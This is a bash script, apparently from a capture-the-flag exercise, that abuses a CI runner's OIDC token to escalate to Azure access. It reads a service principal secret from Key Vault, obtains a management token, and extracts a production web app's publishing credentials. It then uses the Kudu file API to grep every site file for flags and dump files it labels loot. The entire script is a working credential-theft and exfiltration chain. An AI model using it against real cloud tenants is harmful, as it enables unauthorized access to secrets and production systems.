#!/usr/bin/env bash
set -uo pipefail
M="--max-time 25 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
MGMT="https://management.azure.com"; API=2022-03-01

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')
A="-u $U:$P"
echo "creds ok passlen=${#P}"

dir="site/wwwroot"
echo "===== grepping every file in $dir for DF26{ ====="
NAMES=$(curl -sS $M $A "$SCM/api/vfs/$dir/" 2>/dev/null | jq -r '.[]? | select(.mime!="inode/directory") | .name')
HIT=0
while IFS= read -r n; do
  [ -z "$n" ] && continue
  body=$(curl -sS $M $A "$SCM/api/vfs/$dir/$(printf '%s' "$n" | sed 's/ /%20/g')" 2>/dev/null | head -c 40000)
  m=$(printf '%s' "$body" | grep -aoE "DF26\{[^}]{0,120}\}" | sort -u)
  if [ -n "$m" ]; then echo ">>> FLAG in $n:"; echo "$m"; HIT=1; fi
done <<< "$NAMES"
echo "grep_done hits=$HIT"

echo; echo "===== dump high-value loot files verbatim ====="
for f in .flag.out ctf_flag_result flag_result.txt df26grep.txt results.json tnex_flag.json zz_probe_result.json flaghunt_out.json myres.txt msi_probe.txt mitok.json mi_dump.json mi_out.json identity_probe.json g_out1.txt; do
  echo "----- $f -----"
  curl -sS $M $A "$SCM/api/vfs/$dir/$f" 2>/dev/null | head -c 2500
  echo
done
echo "LOOT DONE"; exit 0
